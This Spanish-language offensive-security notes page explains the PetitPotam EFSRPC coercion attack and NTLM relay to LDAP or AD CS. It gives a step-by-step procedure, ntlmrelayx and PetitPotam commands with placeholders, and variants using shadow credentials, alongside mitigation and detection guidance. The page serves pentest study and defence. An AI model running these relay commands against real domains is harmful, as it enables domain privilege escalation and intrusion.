---
topic: PetitPotam — coerción EFSRPC y relay NTLM
tags: [windows, active-directory, petitpotam, ntlm-relay, coercion]
---

# PetitPotam — coerción EFSRPC y relay NTLM

[🌐 English](petitpotam-coercion.en.md) | **Español**

## Concepto

PetitPotam abusa de MS-EFSRPC para obligar a una máquina Windows a autenticarse contra un host controlado. Si LDAP signing o SMB signing no están exigidos, el hash NetNTLM de la cuenta máquina se puede retransmitir a LDAP o a AD CS y obtener acceso al dominio. Es una primitiva de coerción, no un robo de contraseña.

## Cuándo aplica

- El host víctima expone EFSRPC y no está parcheado contra CVE-2021-36942.
- LDAP signing, channel binding o SMB signing no están exigidos.
- Se busca mover de una cuenta de máquina a privilegios de dominio o AD CS.

## Procedimiento

1. Comprobar si el host responde a EFSRPC y si LDAP/SMB signing están deshabilitados.
2. Iniciar `ntlmrelayx` contra LDAP o AD CS con el objetivo adecuado.
3. Ejecutar PetitPotam contra el host víctima y el listener.
4. Usar la sesión relayada para crear una shadow credential, cambiar una contraseña o solicitar un certificado.

## Comandos

```bash
ntlmrelayx.py -t ldap://<DC> --escalate-user <USER>
python3 PetitPotam.py -d <DOMAIN> -u <USER> -p '<PASS>' <LISTENER> <TARGET>
# Variante con EFSRPC
python3 PetitPotam.py -pipe efsrpc <LISTENER> <TARGET>
```

## Variantes

- Relay a AD CS (`http://<CA>/certsrv/certfnsh.asp`) para obtener un certificado de máquina.
- Coerción con DFSCoerce o ShadowCoerce cuando EFSRPC está bloqueado.
- Combinar con shadow credentials sobre la cuenta relayada.

## Limitaciones

- Microsoft parcheó CVE-2021-36942; los hosts actualizados rechazan la coerción.
- LDAP signing, channel binding y SMB signing bloquean el relay.
- La cuenta máquina debe tener permisos útiles en el destino.

## Mitigación

- Aplicar el parche de CVE-2021-36942 y deshabilitar EFSRPC si no se usa.
- Exigir LDAP signing, channel binding, SMB signing y EPA.
- Auditar relays y restringir la salida SMB de las estaciones.

## Detección

- Autenticaciones de cuentas máquina hacia hosts que no son DC.
- Eventos 4624/4768 con origen inesperado y NTLM.
- Tráfico EFSRPC desde un host que no usa Encrypting File System.

## Referencias

- [0xdf — Mist](https://0xdf.gitlab.io/2024/10/26/htb-mist.html)
- [NVD — CVE-2021-36942](https://nvd.nist.gov/vuln/detail/CVE-2021-36942)
- [PetitPotam — GitHub](https://github.com/topotam/PetitPotam)
